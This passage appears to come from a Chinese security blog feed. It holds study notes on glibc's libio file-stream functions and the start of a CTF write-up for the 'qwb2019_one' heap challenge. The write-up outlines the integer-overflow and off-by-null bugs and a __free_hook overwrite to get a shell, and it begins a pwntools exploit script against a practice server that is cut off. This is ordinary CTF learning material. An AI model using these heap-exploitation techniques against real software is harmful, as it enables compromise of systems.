</ol>
<h4 id="IO-old-init"><a href="#IO-old-init" class="headerlink" title="_IO_old_init"></a>_IO_old_init</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_old_init (_IO_FILE *fp, <span class="keyword">int</span> flags)</span><br></pre></td></tr></table></figure>

<h5 id="参数-7"><a href="#参数-7" class="headerlink" title="参数"></a>参数</h5><ul>
<li>fp: 文件流指针</li>
<li>flags: __flags</li>
</ul>
<h5 id="流程-7"><a href="#流程-7" class="headerlink" title="流程"></a>流程</h5><p>对 _flags 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h3 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h3><p>位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_new_file_init (struct _IO_FILE_plus *fp)</span><br></pre></td></tr></table></figure>

<h4 id="参数-8"><a href="#参数-8" class="headerlink" title="参数"></a>参数</h4><ul>
<li>fp: 文件流指针</li>
</ul>
<h4 id="流程-8"><a href="#流程-8" class="headerlink" title="流程"></a>流程</h4><p>设置一些 _flags，然后调用 _IO_link_in，最后将 _fileno 赋值为 -1。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment"> of our file descriptor.Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment"> position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">_IO_link_in (fp);</span><br><span class="line">fp-&gt;file._fileno = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure>

<h4 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h4><p>位于 /libio/genops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_link_in (struct _IO_FILE_plus *fp)</span><br></pre></td></tr></table></figure>

<h5 id="参数-9"><a href="#参数-9" class="headerlink" title="参数"></a>参数</h5><ul>
<li>fp: 文件流指针</li>
</ul>
<h5 id="流程-9"><a href="#流程-9" class="headerlink" title="流程"></a>流程</h5><p>检查 _flags 中的 _IO_LINKED，即有无被链入 _IO_list_all。之后则将其链入，主要是设置 _chain 与 _IO_list_all。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line">    run_fp = (_IO_FILE *) fp;</span><br><span class="line">    _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">    _IO_list_all = fp;</span><br><span class="line">    ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">    run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IO-file-fopen"><a href="#IO-file-fopen" class="headerlink" title="_IO_file_fopen"></a>_IO_file_fopen</h3><p>位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_new_file_fopen (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32not64)</span><br></pre></td></tr></table></figure>

<h4 id="参数-10"><a href="#参数-10" class="headerlink" title="参数"></a>参数</h4><ul>
<li>fp: 文件流指针</li>
<li>filename: 文件名</li>
<li>mode: 打开方式</li>
<li>is32not64: 如其名</li>
</ul>
<h4 id="流程-10"><a href="#流程-10" class="headerlink" title="流程"></a>流程</h4><ol>
<li>声明定义变量，然后调用检查是否打开文件，已经打开则直接返回。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line"><span class="keyword">int</span> read_write;</span><br><span class="line"><span class="keyword">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">_IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *cs;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
<li>根据 mode 的值，设置对应 _flags 的变量。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (*mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">        omode = O_RDONLY;</span><br><span class="line">        read_write = _IO_NO_WRITES;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        omode = O_WRONLY;</span><br><span class="line">        oflags = O_CREAT|O_TRUNC;</span><br><span class="line">        read_write = _IO_NO_READS;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        omode = O_WRONLY;</span><br><span class="line">        oflags = O_CREAT|O_APPEND;</span><br><span class="line">        read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        __set_errno (EINVAL);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (*++mode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            omode = O_RDWR;</span><br><span class="line">            read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">            last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">            last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">            last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">            fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">            oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* Ignore.*/</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>调用 _IO_file_open，打开文件，执行系统调用 open 打开文件。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write, is32not64);</span><br></pre></td></tr></table></figure></li>
<li>最后根据结果，再执行最后的一些设置，太长了，省略吧。</li>
</ol>
<h4 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_file_open (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> posix_mode, <span class="keyword">int</span> prot, <span class="keyword">int</span> read_write, <span class="keyword">int</span> is32not64)</span><br></pre></td></tr></table></figure>

<h5 id="参数-11"><a href="#参数-11" class="headerlink" title="参数"></a>参数</h5><ul>
<li>fp: 文件流指针</li>
<li>filename: 文件名</li>
<li>posix_mode: 打开方式</li>
<li>prot: </li>
<li>read_write: </li>
<li>is32not64: 如其名</li>
</ul>
<h5 id="流程-11"><a href="#流程-11" class="headerlink" title="流程"></a>流程</h5><ol>
<li>声明 fdsec 作为一个临时变量，并根据 _flags 来执行系统调用 open 打开文件。若未打开则返回。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li>
<li>接着利用 fdsec 来设置 fp 。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_fileno = fdesc;</span><br><span class="line">_IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line"><span class="comment">/* For append mode, send the file offset to the end of the file.Don&#x27;t</span></span><br><span class="line"><span class="comment"> update the offset cache though, since the file handle is not active.*/</span></span><br><span class="line"><span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">&#123;</span><br><span class="line">    _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">    &#123;</span><br><span class="line">        close_not_cancel (fdesc);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>最后再次使用 _IO_link_in 确保链入。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line"><span class="keyword">return</span> fp;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-un-link"><a href="#IO-un-link" class="headerlink" title="_IO_un_link"></a>_IO_un_link</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_un_link (struct _IO_FILE_plus *fp)</span><br></pre></td></tr></table></figure>

<h4 id="流程-12"><a href="#流程-12" class="headerlink" title="流程"></a>流程</h4><ol>
<li>首先检查 _IO_LINKED<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line">    run_fp = (_IO_FILE *) fp;</span><br><span class="line">    _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li>检查 _IO_list_all，为空则什么都不执行<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>当 fp 在链表头部时，直接对 _IO_lsit_all 进行修改。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">    ++_IO_list_all_stamp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>否则，循环遍历 _chain，找出 fp 对应的文件流，然后修改<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">        <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">        &#123;</span><br><span class="line">            *f = fp-&gt;file._chain;</span><br><span class="line">            ++_IO_list_all_stamp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>最后修改 _flags<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    fp-&gt;file._flags &amp;= ~_IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">    run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">    _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="IO-new-fclose"><a href="#IO-new-fclose" class="headerlink" title="_IO_new_fclose"></a>_IO_new_fclose</h2><p>位于 /libio/iofclose.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br></pre></td></tr></table></figure>

<h3 id="流程-13"><a href="#流程-13" class="headerlink" title="流程"></a>流程</h3><ol>
<li>声明变量，检查 _flags 是否包含 _IO_IS_FILEBUF。有则调用 _IO_un_link，作用是将 fp 从 _IO_list_all 中取出，上面有。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="comment">/* First unlink the stream.  */</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure></li>
<li>然后设置 _IO_acquire_lock_file，并再次检查 _flags</li>
</ol>
<ul>
<li>满足，则调用 _IO_file_close_it，检查并设置了一些 _flags。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>
否则，设置 _flags<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_release_lock (fp);</span><br><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure></li>
<li>根据 _mode，大于 0 时执行<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _LIBC</span></span><br><span class="line">    <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">    the conversion functions.   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">    __libc_lock_lock (__gconv_lock);</span><br><span class="line">    __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">    __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">    __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
小于等于 0 时<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">&#123;</span><br><span class="line">    fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-file-close-it"><a href="#IO-file-close-it" class="headerlink" title="_IO_file_close_it"></a>_IO_file_close_it</h3><p>位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_new_file_close_it (_IO_FILE *fp)</span><br></pre></td></tr></table></figure>

<h4 id="流程-14"><a href="#流程-14" class="headerlink" title="流程"></a>流程</h4><ol>
<li>检查文件是否打开<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> write_status;</span><br><span class="line"><span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br></pre></td></tr></table></figure></li>
<li>根据 _flags，刷新缓冲区，并设置 _markers 为 0<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span> &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_IO_unsave_markers (fp);</span><br></pre></td></tr></table></figure></li>
<li>调用 _close 关闭文件 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span> ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></li>
<li>输入输出缓冲区以及设置指针<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Free buffer. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_have_wbackup (fp))</span><br><span class="line">        _IO_free_wbackup_area (fp);</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    _IO_wsetg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    _IO_wsetp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li>设置base指针，并释放缓冲区；置零输入缓冲区；置零输出缓冲区<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
<li>从 _IO_list_all 中取出，并设置 _flags，返回状态。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯往年部分pwn_wp</title>
    <url>/2022/07/23/qwb%E5%BE%80%E5%B9%B4%E9%83%A8%E5%88%86pwn-wp/</url>
    <content><![CDATA[<p>待续</p>
<span id="more"></span>

<h2 id="qwb2019-one"><a href="#qwb2019-one" class="headerlink" title="qwb2019_one"></a>qwb2019_one</h2><p>不知道为何远程打不通，老是容易在中间某个循环中断掉。怀疑是 exp 太长了导致超时。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，保护全开。</p>
<p>含有通常堆题的功能外还存在一个 backdoor。</p>
<ul>
<li>add: 申请一个 0x30(mem_size) 大小的 chunk，输入大小为 0x20，会检测这个 chunk 的地址是否处于规定范围内</li>
<li>edit: 修改 chunk 中的一个字节内容，类似 replace</li>
<li>show: 展示 chunk 内容，会检查 chunk 中字符串长度释放大于 0x20</li>
<li>remove: 删除 chunk</li>
<li>backdoor: 程序申请的5个 0x20 大小 chunk 的内容，内容为随机字符串</li>
</ul>
<h4 id="漏洞与利用"><a href="#漏洞与利用" class="headerlink" title="漏洞与利用"></a>漏洞与利用</h4><ul>
<li>backdoor 中使用<code>abs32(get_int()) % 5</code>来确定输出 chunk，但是由于 get_int 返回的整数是被补齐到8字节，因此存在整数溢出漏洞。可以利用来输出这个5个 chunk 地址之上的内容。</li>
<li>edit 功能中使用 strchr 来查找指定字符，这个字符可以是<code>\0</code>，因此存在溢出漏洞。可以利用此来修改 next_chunk 中的大小与内容。</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>利用 backdoor 泄露 elf_base</li>
<li>利用 edit 的溢出，进行堆扩展，获得一块 0x441 大小的 chunk，释放后在申请一个 chunk 实现堆重叠，释放掉这个 chunk 泄露获得 libc 版本</li>
<li>利用 edit 的溢出，修改 next_chunk 的内容，使用 unlink，目的是修改 chunk 范围，从而能够申请 __free_hook</li>
<li>最后覆盖 __free_hook 为 system 来 getshell</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./one&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26223</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./one&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;command&gt;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">string</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span 